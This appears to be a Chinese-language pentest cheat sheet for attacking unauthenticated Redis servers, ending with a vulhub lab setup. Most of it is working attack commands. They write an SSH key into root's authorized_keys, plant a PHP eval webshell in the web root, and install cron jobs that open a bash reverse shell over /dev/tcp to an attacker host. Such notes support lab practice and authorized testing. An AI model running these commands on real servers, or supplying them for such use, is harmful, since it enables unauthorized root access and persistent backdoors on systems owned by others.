# 6379 Redis

## 未授权访问

```bash
HOST=; PORT=6379; # TARGET INFO
```

```bash
telnet $HOST $PORT
INFO
# 如果可以返回 refis 相关信息则代表存在未授权访问
```

## 文件写入

文件写入时首先采用写入 SSH 公钥的方式。

写入文件或计划任务可能影响目标服务器 redis 正常运行。

```bash
HOST=; PORT=6379; # TARGET HOST INFO
```

```bash
# 写入 SSH 公钥
# LOCAL
ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
cat /tmp/id_rsa.pub | redis-cli -h $HOST -p $PORT -x set crackit
rm /tmp/id_rsa.pub
redis-cli -h $HOST -p $PORT
# REMOTE
CONFIG SET DIR /root/.ssh/
CONFIG SET DBFILENAME "authorized_keys"
SAVE
# LOCAL
ssh -i ~/.ssh/id_rsa root@HOST
redis-cli -h $HOST -p $PORT

# 写入 WebShell
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME exec.php
SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
SAVE

# 写入用户级计划任务
CONFIG SET DIR /var/spool/cron
CONFIG SET DBFILENAME root
SET crackit "\n\n\n\n* * * * * bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
SAVE

# 写入系统级计划任务
CONFIG SET DIR /etc/cron.d
CONFIG SET DBFILENAME reverse_shell
SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
SAVE
```

## UI 工具

[Another Redis Desktop Manager](https://goanother.com/cn/)

## 环境搭建

```bash
# 进入 vulhub 漏洞环境路径
cd ~/hack/envs/vulhub/redis/4-unacc
# 启动环境
docker compose up -d
# 关闭环境
docker compose down
```

